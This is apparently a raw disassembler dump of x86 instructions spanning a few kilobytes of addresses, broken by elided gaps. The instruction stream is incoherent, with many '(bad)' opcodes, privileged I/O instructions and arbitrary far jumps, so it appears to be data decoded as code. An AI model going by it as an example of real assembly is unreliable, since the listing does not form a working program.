  42a954:	mov    ch,0x0
  42a956:	jp     0x42a8fd
  42a958:	push   0x1643c25e
  42a95d:	mov    ds:0xdaab6181,eax
  42a962:	rcl    BYTE PTR ss:[edx],cl
  42a965:	add    eax,0xff9cb19
  42a96a:	xchg   BYTE PTR [esi],cl
  42a96c:	loope  0x42a8ff
  42a96e:	mov    eax,0x458eab69
  42a973:	pop    ds
  42a974:	mov    WORD PTR [eax+0x27c853a0],?
  42a97a:	mov    ah,0xc1
  42a97c:	icebp  
  42a97d:	popa   
  42a97e:	test   edi,edx
  42a980:	sbb    DWORD PTR [ebx+0x49ae6bf6],ebx
  42a986:	(bad)  
  42a988:	dec    edx
  42a989:	xchg   edx,eax
  42a98a:	push   eax
  42a98b:	push   cs
  42a98c:	(bad)  
  42a98d:	xlat   BYTE PTR ds:[ebx]
  42a98e:	(bad)  
  42a98f:	jmp    0x42a919
  42a991:	push   ebp
  42a992:	mov    eax,0xfa29dc9c
  42a997:	dec    esi
  42a998:	ins    DWORD PTR es:[edi],dx
  42a999:	cmc    
  42a99a:	xchg   ecx,eax
  42a99b:	loopne 0x42aa0f
  42a99d:	enter  0x59e6,0x74
  42a9a1:	lock jne 0x42a98d
  42a9a4:	inc    edi
  42a9a5:	not    DWORD PTR [edi]
  42a9a7:	lea    edi,[edx+edx*1-0x71]
  42a9ab:	and    eax,0x45df7b86
  42a9b0:	xor    eax,0xd9065cfb
  42a9b5:	dec    eax
  42a9b6:	fidivr WORD PTR [ebp-0x16fa2f0]
  42a9bc:	sub    eax,0xc4d01bec
  42a9c1:	jge    0x42aa21
  42a9c3:	mov    ah,0x91
  42a9c5:	imul   esi,DWORD PTR [ebp+0x42],0xffffff90
  42a9c9:	and    ecx,eax
  42a9cb:	inc    ecx
  42a9cc:	gs retf 
  42a9ce:	mov    bl,BYTE PTR [edx+0x46]
  42a9d1:	add    BYTE PTR [ecx],dl
  42a9d3:	bound  ebx,QWORD PTR [ebx+edx*8]
  42a9d6:	push   0xcd4f3214
  42a9db:	test   al,0x83
  42a9dd:	mov    ah,BYTE PTR [esp+eiz*4+0x31]
  42a9e1:	push   es
  42a9e2:	(bad)  
  42a9e3:	pop    eax
  42a9e4:	cli    
  42a9e5:	inc    edx
  42a9e6:	xchg   BYTE PTR [edx+ebx*8],ch
  42a9e9:	inc    edx
  42a9ea:	les    eax,FWORD PTR [edx+eiz*8+0x66]
	...
  42aa56:	test   al,0x93
  42aa58:	sbb    eax,0xfbee3fee
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa63:	aaa    
  42aa64:	fs ds addr16 leave 
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	sti    
  42aa6f:	das    
  42aa70:	mov    es,WORD PTR [eax+0x22332156]
  42aa76:	cmp    DWORD PTR [ebx],ebp
  42aa78:	ret    
  42aa79:	mov    ecx,DWORD PTR [esi+edx*2]
  42aa7c:	push   es
  42aa7d:	jle    0x42aa71
  42aa7f:	fcom   QWORD PTR [ebp-0x41]
  42aa82:	retf   
  42aa83:	and    edx,DWORD PTR [edi-0x1c514de7]
  42aa89:	push   ecx
  42aa8a:	adc    ah,cl
  42aa8c:	(bad)  
  42aa8d:	bound  ebp,QWORD PTR [eiz*8-0x5c2db695]
  42aa94:	cmp    eax,0x8342c300
  42aa99:	xchg   BYTE PTR [ecx-0x2e06ec22],bl
  42aa9f:	mov    esp,0xf23517f5
  42aaa4:	dec    esp
  42aaa5:	lock cdq 
  42aaa7:	sub    BYTE PTR [ebx+0x633b352a],0x7a
  42aaae:	jp     0x42ab19
  42aab0:	and    DWORD PTR [edx-0x5219c001],edi
  42aab6:	repnz jmp 0x4433:0x4dad9bcb
  42aabe:	(bad)
  42aac1:	lahf   
  42aac2:	xchg   ebp,eax
  42aac3:	loop   0x42aadd
  42aac5:	sub    ebp,edi
  42aac7:	sbb    BYTE PTR [esi-0x1538a387],al
  42aacd:	loopne 0x42aa59
  42aacf:	xlat   BYTE PTR ds:[ebx]
  42aad0:	(bad)  
  42aad1:	mov    edi,0x74c6e728
  42aad6:	push   eax
  42aad7:	ret    
  42aad8:	jmp    0x50b4:0x30946d62
  42aadf:	ror    DWORD PTR [edi-0x48d073a],cl
  42aae5:	sub    edi,DWORD PTR [ebx]
  42aae7:	outs   dx,BYTE PTR ds:[esi]
  42aae8:	aaa    
  42aae9:	dec    eax
  42aaea:	sar    ebx,1
  42aaec:	js     0x42aad9
  42aaee:	lods   eax,DWORD PTR ds:[esi]
  42aaef:	mov    ah,BYTE PTR [edi]
  42aaf1:	jge    0x759d244b
  42aaf7:	ficom  WORD PTR [esi]
  42aaf9:	shl    BYTE PTR [ebp-0x57],0x2a
  42aafd:	je     0x42ab0f
  42aaff:	out    0x93,eax
  42ab01:	mov    esi,0xa3208951
  42ab06:	scas   eax,DWORD PTR es:[edi]
  42ab07:	and    dl,BYTE PTR [ebp+0x48]
  42ab0a:	dec    esp
  42ab0b:	jb     0x42ab43
  42ab0d:	test   BYTE PTR [eax],dh
  42ab0f:	lock jg 0x42ab32
  42ab12:	jge    0x42aae3
  42ab14:	aas    
  42ab15:	dec    ebp
  42ab16:	icebp  
  42ab17:	aas    
  42ab18:	int3   
  42ab19:	mov    ebx,0x6e04c008
  42ab1e:	shr    dh,1
  42ab20:	std    
  42ab21:	mov    dh,0x80
  42ab23:	pop    ds
  42ab24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab25:	mov    ds:0xafb10603,al
  42ab2a:	icebp  
  42ab2b:	and    al,0x35
  42ab2d:	push   ebp
  42ab2e:	arpl   ax,sp
  42ab30:	pop    ebp
  42ab31:	jae    0x42aabf
  42ab33:	add    DWORD PTR ds:0x86f230aa,0x1fd7d38d
  42ab3d:	(bad)  
  42ab3e:	loope  0x42aafd
  42ab40:	daa    
  42ab41:	popa   
  42ab42:	scas   al,BYTE PTR es:[edi]
  42ab43:	cwde   
  42ab44:	jmp    0xfced:0x1cd259f8
  42ab4b:	in     al,dx
  42ab4c:	in     al,dx
  42ab4d:	cmp    BYTE PTR [ebx-0x56],0xa1
  42ab51:	jbe    0x42ab80
  42ab53:	iret   
  42ab54:	cli    
  42ab55:	push   ds
  42ab56:	sbb    cl,BYTE PTR [esi+0x66]
  42ab59:	repnz add BYTE PTR [ebx+esi*8-0x2a3e0bf9],cl
  42ab61:	cwde   
  42ab62:	data16 outs dx,BYTE PTR ds:[esi]
  42ab64:	xchg   ebp,eax
  42ab65:	rcr    DWORD PTR [ebp+0x76d38933],0xd5
  42ab6c:	clc    
  42ab6d:	jmp    0x0:0x0
	...
  42abd4:	add    BYTE PTR [eax],al
  42abd6:	ds push cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	sbb    dl,ch
  42abe4:	and    dl,ah
  42abe6:	addr16 retf 0x1
  42abea:	add    BYTE PTR [ecx],al
  42abec:	add    BYTE PTR [eax],al
  42abee:	mov    al,ds:0xada777
  42abf3:	in     eax,dx
  42abf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42abf5:	and    DWORD PTR [edi-0xb9cac83],ebp
  42abfb:	dec    edi
  42abfc:	outs   dx,BYTE PTR ds:[esi]
  42abfd:	jbe    0x42ab82
  42abff:	fldenv [edi]
  42ac01:	iret   
  42ac02:	stos   BYTE PTR es:[edi],al
  42ac03:	and    ebp,DWORD PTR [edx+0x6d]
  42ac06:	cmp    BYTE PTR [ebp+esi*1-0x3f],cl
  42ac0a:	mov    ?,WORD PTR [esi]
  42ac0c:	mov    ds:0xa456bf2c,eax
  42ac11:	pop    ecx
  42ac12:	xchg   ebp,eax
  42ac13:	mov    bh,0x7e
  42ac15:	enter  0x5c3f,0xdc
  42ac19:	fisub  WORD PTR [edx-0x18]
  42ac1c:	mov    ah,0x1c
  42ac1e:	or     DWORD PTR [edi],ebp
  42ac20:	loop   0x42ac2c
  42ac22:	repnz cmp BYTE PTR [esi],ah
  42ac25:	or     cl,BYTE PTR [edi-0x59]
  42ac28:	and    al,dl
  42ac2a:	jno    0x42aca8
  42ac2c:	inc    esp
  42ac2d:	(bad)  [edi+0x51ead5b3]
  42ac33:	xlat   BYTE PTR ds:[ebx]
  42ac34:	inc    ebp
  42ac35:	ret    
  42ac36:	and    DWORD PTR [ecx-0x51],esp
  42ac39:	push   0xfffffff0
  42ac3b:	cmp    eax,0xd33ec3f4
  42ac40:	ins    BYTE PTR es:[edi],dx
  42ac41:	xor    DWORD PTR [eax],0x54b02407
  42ac47:	(bad)  
  42ac48:	push   0xf4703e7a
  42ac4d:	sbb    DWORD PTR [ecx-0x7e],ebp
  42ac50:	test   DWORD PTR [esp+edx*8-0x657dea14],0x96fbb789
  42ac5b:	push   ebp
  42ac5c:	enter  0x45da,0xb4
  42ac60:	sub    ecx,ecx
  42ac62:	push   edx
  42ac63:	popf   
  42ac64:	push   edx
  42ac65:	dec    ebx
  42ac66:	and    eax,0x8f545a18
  42ac6b:	mov    edx,0x1735bc5a
  42ac70:	push   esi
  42ac71:	fidiv  WORD PTR [eax+0x6ba509dd]
  42ac77:	out    dx,eax
  42ac78:	jmp    0x42abfe
  42ac7a:	xor    dl,BYTE PTR [ebx-0x28]
  42ac7d:	and    al,0x77
  42ac7f:	retf   
  42ac80:	stc    
  42ac81:	mov    ebx,0xce340a67
  42ac86:	mov    cl,0x9a
  42ac88:	data16 sti 
  42ac8a:	arpl   WORD PTR [edi+0x7a1733f5],sp
  42ac90:	fbld   TBYTE PTR [edi+edx*8+0x1bfcb868]
  42ac97:	pop    es
  42ac98:	in     eax,0x19
  42ac9a:	jne    0x42ad00
  42ac9c:	fsave  [ebp+0x21]
  42aca0:	pop    eax
  42aca1:	ret    0xc01
  42aca4:	dec    eax
  42aca5:	xor    eax,0xb863423e
  42acaa:	adc    edx,DWORD PTR [edi]
  42acac:	and    DWORD PTR [eax+0x5],edi
  42acaf:	mov    ebx,0xcebd2858
  42acb4:	ror    BYTE PTR [esi],cl
  42acb6:	mov    ds:0x6f77b208,eax
  42acbb:	arpl   WORD PTR [esi],bp
  42acbd:	push   ebp
  42acbe:	cwde   
  42acbf:	push   0xdad2d4c2
  42acc4:	out    0x89,eax
  42acc6:	js     0x42ac69
  42acc8:	xor    eax,0x31b11cfb
  42accd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42acce:	mov    dl,0xe2
  42acd0:	sub    esi,DWORD PTR [esi-0x80]
  42acd3:	jp     0x42ad3d
  42acd5:	adc    esi,esp
  42acd7:	inc    esp
  42acd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42acd9:	push   cs
  42acda:	mov    ds:0xd209082a,al
  42acdf:	pop    esi
  42ace0:	sbb    ah,ch
  42ace2:	adc    eax,eax
  42ace4:	jecxz  0x42acbe
  42ace6:	pop    ebp
  42ace7:	mov    esp,0x7e6b1d51
  42acec:	or     ch,BYTE PTR [eax+0x0]
	...
  42ad53:	add    BYTE PTR [eax],al
  42ad55:	add    cl,ch
  42ad57:	xor    bl,BYTE PTR [edx+edi*1]
  42ad5a:	fistp  QWORD PTR [esi]
  42ad5c:	out    dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	jae    0x42ad80
  42ad64:	xchg   ebp,eax
  42ad65:	icebp  
  42ad66:	addr16 retf 
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	add    BYTE PTR [ecx],al
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	pop    eax
  42ad6f:	sbb    esi,DWORD PTR [edi]
  42ad71:	mov    bh,dl
  42ad73:	cdq    
  42ad74:	stc    
  42ad75:	inc    esi
  42ad76:	jnp    0x42adec
  42ad78:	mov    dh,0x27
  42ad7a:	gs pop ebx
  42ad7c:	enter  0x588a,0xe5
  42ad80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad81:	and    ecx,DWORD PTR [eax]
  42ad83:	adc    eax,0x17c94bcd
  42ad88:	dec    ecx
  42ad89:	xchg   DWORD PTR [ebp+0x38],esp
  42ad8c:	xchg   edi,eax
  42ad8d:	bnd jno 0x42ad32
  42ad90:	pop    esp
  42ad91:	clc    
  42ad92:	clc    
  42ad93:	push   ds
  42ad94:	pushf  
  42ad95:	adc    BYTE PTR [edi],dl
  42ad97:	retf   0x46fe
  42ad9a:	icebp  
  42ad9b:	scas   al,BYTE PTR es:[edi]
  42ad9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad9d:	sub    DWORD PTR [eax],eax
  42ad9f:	data16 test dl,cl
  42ada2:	or     bh,al
  42ada4:	xor    DWORD PTR [edx+0x35],ecx
  42ada7:	fwait
  42ada8:	ret    0x92d8
  42adab:	adc    ebx,ebx
  42adad:	adc    al,0x50
  42adaf:	pop    edx
  42adb0:	mov    dl,0xb3
  42adb2:	mov    esp,0xf378b1c3
  42adb7:	(bad)  
  42adb8:	mov    ds:0x8b21a2e2,eax
  42adbd:	sub    esi,DWORD PTR [esi-0x2c685130]
  42adc3:	ja     0x42adb1
  42adc5:	jo     0x42ad6d
  42adc7:	mov    ds:0xe62978c1,al
  42adcc:	xchg   edi,eax
  42adcd:	cmp    al,0x3
  42adcf:	xchg   bl,al
  42add1:	ds xor DWORD PTR ss:[ebp+0x1f],esi
  42add6:	xchg   BYTE PTR [edi-0x6f4510cf],al
  42addc:	lahf   
  42addd:	push   ebp
  42adde:	or     DWORD PTR [eax-0x7a],esp
  42ade1:	mov    dh,0x3b
  42ade3:	cld    
  42ade4:	fbstp  TBYTE PTR [esi]
  42ade6:	jge    0x42ae3b
  42ade8:	pop    ds
  42ade9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42adea:	das    
  42adeb:	jne    0x42ae66
  42aded:	ret    
  42adee:	inc    ebp
  42adef:	fs out dx,al
  42adf1:	xor    eax,0xb8ba9769
  42adf6:	add    DWORD PTR [edx+edi*4],eax
  42adf9:	xor    al,ch
  42adfb:	cld    
  42adfc:	fadd   QWORD PTR [edx-0x5c3262b]
  42ae02:	out    dx,eax
  42ae03:	test   BYTE PTR [edi-0x101a94c0],dh
  42ae09:	fisttp WORD PTR [eax-0x23bd407a]
  42ae0f:	mov    ds:0x3817dd3c,al
  42ae14:	inc    eax
  42ae15:	adc    ch,BYTE PTR [edi+ebp*8+0x56]
  42ae19:	ja     0x42ae4e
  42ae1b:	xor    ah,bl
  42ae1d:	shl    BYTE PTR [edx],0x40
  42ae20:	sti    
  42ae21:	sbb    BYTE PTR [ebx],bh
  42ae23:	or     al,0xe9
  42ae25:	or     al,0x3d
  42ae27:	xchg   BYTE PTR [edi-0x5c37dae6],ch
  42ae2d:	popa   
  42ae2e:	adc    al,0xe9
  42ae31:	xchg   esi,eax
  42ae32:	jns    0x42ae2d
  42ae34:	cdq    
  42ae35:	mov    eax,ds:0x1093c691
  42ae3a:	push   ebx
  42ae3b:	or     eax,0x366612c6
  42ae40:	push   ebp
  42ae41:	jmp    0x42ae93
  42ae43:	xor    ecx,DWORD PTR [esi-0x29a73c87]
  42ae49:	cmp    ch,cl
  42ae4b:	dec    ecx
  42ae4c:	mov    eax,0x72f2cf9d
  42ae51:	arpl   WORD PTR [edi+0x1b],bx
  42ae54:	aam    0x83
  42ae56:	sbb    edx,DWORD PTR [eax+0x4e]
  42ae59:	psubsb mm3,mm0
  42ae5c:	mov    al,0x30
  42ae5e:	jns    0x42ae87
  42ae60:	mov    bh,0x9a
  42ae62:	cmp    ebp,DWORD PTR [edi+0x5b7b4820]
  42ae68:	jo     0x42aeaf
  42ae6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae6b:	scas   eax,DWORD PTR es:[edi]
  42ae6c:	pop    esp
  42ae6d:	or     BYTE PTR [eax],al
	...
  42aed3:	add    BYTE PTR [eax],al
  42aed5:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	fcmovnb st,st(2)
  42aee4:	jl     0x42ae8f
  42aee6:	addr16 int3 
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	add    BYTE PTR [ecx],al
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aeef:	ret    
  42aef0:	or     BYTE PTR [eax+0x605fbfbb],dl
  42aef6:	enter  0xc030,0x76
  42aefa:	adc    al,0x3e
  42aefc:	xor    DWORD PTR [esi+0x26b30b01],ebx
  42af02:	imul   edi,DWORD PTR [edi+0x3ea744f9],0xffffffab
  42af09:	dec    esp
  42af0a:	push   es
  42af0b:	out    0x54,eax
  42af0d:	nop
  42af0e:	pop    es
  42af0f:	add    DWORD PTR [ebx-0x517d5e5b],edi
  42af15:	sub    eax,0xc8c6d223
  42af1a:	fldenv fs:[ebx+0x40]
  42af1e:	(bad)  
  42af1f:	retf   0x98e2
  42af22:	je     0x42af8c
  42af24:	das    
  42af25:	hlt    
  42af26:	sub    ebp,ebx
  42af28:	pop    es
  42af29:	(bad)  
  42af2a:	pop    ss
  42af2b:	inc    ecx
  42af2c:	add    BYTE PTR [ebx],dh
  42af2e:	push   0xe18e608f
  42af33:	sub    eax,0x66441d5d
  42af38:	sti    
  42af39:	mov    edi,edi
  42af3b:	xor    eax,0xfda84dd0
  42af40:	cs int3 
  42af42:	outs   dx,BYTE PTR ds:[esi]
  42af44:	pop    esp
  42af45:	dec    ebp
  42af46:	add    edi,ebp
  42af48:	sub    BYTE PTR [ebp+edx*1+0x4c2ffd19],ah
  42af4f:	sti    
  42af50:	popa   
  42af51:	lds    edx,FWORD PTR [edi+0x740d5e6f]
  42af57:	cmp    edx,DWORD PTR ds:0xeab48cc8
  42af5d:	ss mov cl,0xd0
  42af60:	mov    WORD PTR [edx+0x51],gs
  42af63:	jmp    0x42af89
  42af65:	mov    ds:0x72342350,al
  42af6a:	mov    ebp,0x7d62e314
  42af6f:	mov    esp,0x10f401fb
  42af74:	fmul   DWORD PTR [eax-0x50]
  42af77:	inc    ecx
  42af78:	loop   0x42af87
  42af7a:	xchg   ch,dh
  42af7c:	mov    ebp,0xca2ed737
  42af81:	mov    dh,0x6a
  42af83:	(bad)  [ecx+0x3f]
  42af86:	sbb    ah,ah
  42af88:	lods   al,BYTE PTR ds:[esi]
  42af89:	stos   BYTE PTR es:[edi],al
  42af8a:	push   ebp
  42af8b:	outs   dx,BYTE PTR ds:[esi]
  42af8c:	xor    al,ah
  42af8e:	minps  xmm5,xmm7
  42af91:	js     0x42af1f
  42af93:	ds xchg ecx,eax
  42af95:	inc    eax
  42af96:	xor    eax,0xccd6defc
  42af9b:	lods   eax,DWORD PTR ds:[esi]
  42af9c:	nop
  42af9d:	pop    ebp
  42af9e:	gs jge 0x42af26
  42afa1:	mov    eax,0x5d2c4345
  42afa6:	mov    cl,0x5a
  42afa8:	jl     0x42afc8
  42afaa:	pushf  
  42afab:	mov    ch,0xbe
  42afad:	add    al,0xc5
  42afaf:	sbb    al,0x16
  42afb1:	sbb    DWORD PTR [eax+0x29],edi
  42afb4:	dec    ebx
  42afb5:	jecxz  0x42afb6
  42afb7:	arpl   WORD PTR [ecx-0x2a714d2c],bx
  42afbd:	cdq    
  42afbe:	ds stos DWORD PTR es:[edi],eax
  42afc0:	ror    BYTE PTR [edi],cl
  42afc2:	jge    0x42afad
  42afc4:	and    DWORD PTR [ebx],edi
  42afc6:	(bad)  
  42afc7:	pop    ds
  42afc8:	mov    ah,0x2
  42afca:	aad    0xf3
  42afcc:	mov    ds:0x86dd71ee,al
  42afd1:	mov    edx,0x91530b55
  42afd6:	outs   dx,DWORD PTR ds:[esi]
  42afd7:	outs   dx,BYTE PTR ds:[esi]
  42afd8:	call   0xb384:0xce56bd94
  42afdf:	cld    
  42afe0:	jns    0x42afa1
  42afe2:	jmp    0xa2d4:0x6dbcd3b
  42afe9:	push   0xffffff83
  42afeb:	aad    0x59
  42afed:	sahf   
	...
  42b056:	stc    
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	daa    
  42b063:	and    ebp,esp
  42b065:	aam    0x67
  42b067:	int    0x1
  42b069:	add    BYTE PTR [eax],al
  42b06b:	add    DWORD PTR [eax],eax
  42b06d:	add    BYTE PTR [ebp+0x22],bh
  42b070:	rcl    BYTE PTR [ecx],0xb6
  42b073:	stc    
  42b074:	test   eax,0xea76b8be
  42b079:	shl    DWORD PTR [esi+esi*4-0x6a602eb9],cl
  42b080:	hlt    
  42b081:	outs   dx,BYTE PTR ds:[esi]
  42b082:	loope  0x42b005
  42b084:	aad    0x47
  42b086:	ins    BYTE PTR es:[edi],dx
  42b087:	cli    
  42b088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b089:	add    ch,BYTE PTR ds:0xcb104d96
  42b08f:	jb     0x42b027
  42b091:	data16 mov al,ds:0xf7585eeb
  42b097:	(bad)  
  42b098:	into   
  42b099:	jmp    FWORD PTR [esi-0x44a5fb34]
  42b09f:	in     al,0xdc
  42b0a1:	loope  0x42b0df
  42b0a3:	mov    ds:0xbc8eb502,al
  42b0a8:	cmc    
  42b0a9:	out    dx,eax
  42b0aa:	(bad)  
  42b0ab:	mov    BYTE PTR [esi],ch
  42b0ad:	fsub   st(5),st
  42b0af:	xor    eax,ebx
  42b0b1:	fst    DWORD PTR [ebx+0x29]
  42b0b4:	mov    al,ds:0x382dd687
  42b0b9:	push   ds
  42b0ba:	jne    0x42b11b
  42b0bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0bd:	and    esp,DWORD PTR [ebx+0x16]
  42b0c0:	jo     0x42b099
  42b0c2:	add    eax,0x78fbc556
  42b0c7:	loope  0x42b12a
  42b0c9:	xor    DWORD PTR [eax],ebx
  42b0cb:	call   0xdeea:0x233fa0c2
  42b0d2:	mov    ah,0x9d
  42b0d4:	and    ebx,edi
  42b0d6:	iret   
  42b0d7:	push   edx
  42b0d8:	inc    esp
  42b0d9:	push   DWORD PTR [edx]
  42b0db:	test   bl,cl
  42b0dd:	test   al,0x53
  42b0df:	cmp    edi,esi
  42b0e1:	cld    
  42b0e2:	lock xchg edx,eax
  42b0e4:	push   edi
  42b0e5:	inc    eax
  42b0e6:	inc    ebx
  42b0e7:	jmp    0x8200f9f3
  42b0ec:	je     0x42b11d
  42b0ee:	add    esp,DWORD PTR [edx-0x7c49c2af]
  42b0f4:	xchg   ecx,eax
  42b0f5:	inc    edi
  42b0f6:	mov    ch,0x81
  42b0f8:	mov    dh,0x17
  42b0fa:	imul   edi,DWORD PTR [eax+0x58],0x80172ab4
  42b101:	jb     0x42b0af
  42b103:	adc    ch,BYTE PTR [esi+ebx*8+0x7a]
  42b107:	mov    cl,0x2e
  42b109:	mov    WORD PTR [edx-0x63],gs
  42b10c:	in     al,0x56
  42b10e:	aad    0x7
  42b110:	xlat   BYTE PTR cs:[ebx]
  42b112:	pop    edx
  42b113:	mov    bh,0xbf
  42b115:	daa    
  42b116:	cmp    ah,BYTE PTR [ebx-0x7457319a]
  42b11c:	push   0xffffff9c
  42b11e:	sti    
  42b11f:	(bad)  
  42b120:	scas   eax,DWORD PTR es:[edi]
  42b121:	add    al,bh
  42b123:	fidivr WORD PTR [esi-0x4e]
  42b126:	outs   dx,BYTE PTR ds:[esi]
  42b127:	cwde   
  42b128:	mov    DWORD PTR [ebp+0x3e],ecx
  42b12b:	out    dx,al
  42b12c:	popa   
  42b12d:	dec    ebp
  42b12e:	inc    edi
  42b12f:	pop    ds
  42b130:	repz mov edi,0xaed2ac59
  42b136:	aam    0x66
  42b138:	ficom  DWORD PTR [ebp+0x5b47d638]
  42b13e:	test   BYTE PTR [eax+0x65ae7bf0],cl
  42b144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b145:	sbb    al,BYTE PTR [ecx+0x5d]
  42b148:	mov    ah,0x9e
  42b14a:	sahf   
  42b14b:	popf   
  42b14c:	or     bl,ch
  42b14e:	inc    ebx
  42b14f:	inc    eax
  42b150:	(bad)  
  42b151:	sti    
  42b152:	dec    ebx
  42b153:	push   cs
  42b154:	nop
  42b155:	pop    ss
  42b156:	and    eax,0xc17db423
  42b15b:	jne    0x42b0fa
  42b15d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b15e:	popa   
  42b15f:	ret    0x5b2f
  42b162:	aad    0x37
  42b164:	xchg   ebp,eax
  42b165:	cmp    dh,0x92
  42b168:	popf   
  42b169:	pop    es
  42b16a:	mov    esp,0xf290fe
	...
  42b1d3:	add    BYTE PTR [eax],al
  42b1d5:	add    BYTE PTR [ebp+0x25],dh
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	jp     0x42b1dc
  42b1e4:	and    eax,0x1ce6713
  42b1e9:	add    BYTE PTR [eax],al
  42b1eb:	add    DWORD PTR [eax],eax
  42b1ed:	add    ch,ch
  42b1ef:	ja     0x42b1ea
  42b1f1:	adc    al,BYTE PTR [eax+0x597b3b2d]
  42b1f7:	mov    ebp,0x7d02ad26
  42b1fc:	and    ah,ah
  42b1fe:	not    BYTE PTR [esp+ebx*8-0x67]
  42b202:	call   0x6f8ea74f
  42b207:	dec    ecx
  42b208:	adc    al,0x3f
  42b20a:	push   es
  42b20b:	sbb    eax,0x63de8df9
  42b210:	or     DWORD PTR [eax-0x3bb7d517],edi
  42b216:	and    BYTE PTR [ebx+ebp*4-0x26],ah
  42b21a:	sbb    dl,BYTE PTR [ebp-0x7041a90]
  42b220:	inc    ecx
  42b221:	int3   
  42b222:	ds push edx
  42b224:	or     dl,BYTE PTR [edi+0x3cc9473]
  42b22a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b22b:	mov    ch,BYTE PTR [ebx-0x17]
  42b22e:	ret    
  42b22f:	adc    esp,DWORD PTR [edx]
  42b231:	js     0x42b1ef
  42b233:	adc    eax,0x12429657
  42b238:	push   0x77
  42b23a:	into   
  42b23b:	cdq    
  42b23c:	(bad)  
  42b23d:	adc    BYTE PTR [ebp-0x130128f6],bh
  42b243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b244:	or     DWORD PTR [ebp+0x758a7887],esp
  42b24a:	pop    ebx
  42b24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b24c:	or     bl,BYTE PTR [esi]
  42b24e:	or     eax,DWORD PTR [edi]
  42b250:	cmp    edx,edx
  42b252:	loop   0x42b250
  42b254:	and    dl,cl
  42b256:	push   ss
  42b257:	jo     0x42b2ab
  42b259:	mov    al,0xf9
  42b25b:	adc    eax,0x1c98e4b7
  42b260:	repnz pop edx
  42b262:	jno    0x42b2de
  42b264:	pop    es
  42b265:	sbb    DWORD PTR [ebx],ebx
  42b267:	sub    bl,BYTE PTR [di+0x3c]
  42b26b:	sar    DWORD PTR [ebp-0x7b],cl
  42b26e:	fisub  WORD PTR [esi]
  42b270:	and    DWORD PTR [eax-0x4a],edx
  42b273:	ret    0x39d3
  42b276:	cli    
  42b277:	adc    DWORD PTR [edi],0xb02c0371
  42b27d:	stc    
  42b27e:	inc    BYTE PTR [eax-0x7e0f6a89]
  42b284:	xor    dh,BYTE PTR ds:0xfb5894ea
  42b28a:	ficomp WORD PTR [esi-0x7e]
  42b28d:	retf   0xe0b9
  42b290:	sbb    esp,0x65
  42b293:	ret    0x6b8
  42b296:	aas    
  42b297:	ins    DWORD PTR es:[edi],dx
  42b298:	jmp    0xc22b481e
  42b29d:	ss pop ebp
  42b29f:	scas   al,BYTE PTR es:[edi]
  42b2a0:	stos   DWORD PTR es:[edi],eax
  42b2a1:	fwait
  42b2a2:	mov    dh,0x72
  42b2a4:	xor    DWORD PTR [edi+ebx*2-0x6e],esi
  42b2a8:	or     ebx,DWORD PTR [ebx-0x7c]
  42b2ab:	(bad)  
  42b2ac:	retf   
  42b2ad:	push   0xffffff87
  42b2af:	push   DWORD PTR [edi+eiz*1+0x77]
  42b2b3:	adc    eax,0xbff45d20
  42b2b8:	pop    edx
  42b2b9:	dec    eax
  42b2ba:	add    DWORD PTR [esp+eax*1+0x21],edx
  42b2be:	outs   dx,DWORD PTR ds:[esi]
  42b2bf:	pop    edi
  42b2c0:	cmp    al,0xd8
  42b2c2:	jmp    0x42b274
  42b2c4:	call   0x9601ff1c
  42b2c9:	out    0x71,al
  42b2cb:	data16 jno 0x42b265
  42b2ce:	popf   
  42b2cf:	or     DWORD PTR [edi+esi*4],eax
  42b2d2:	mov    ecx,0x86e27e7c
  42b2d7:	fist   DWORD PTR [ebx-0x69180919]
  42b2dd:	add    DWORD PTR [edx-0x16],eax
  42b2e0:	fcomi  st,st(7)
  42b2e2:	jg     0x42b338
  42b2e4:	jbe    0x42b356
  42b2e6:	fucomip st,st(5)
  42b2e8:	jge    0x42b314
  42b2ea:	or     al,BYTE PTR [ecx+0x44]
  42b2ed:	ret    
	...
  42b356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b357:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b35d:	iret   
  42b35e:	sub    eax,0x63738e65
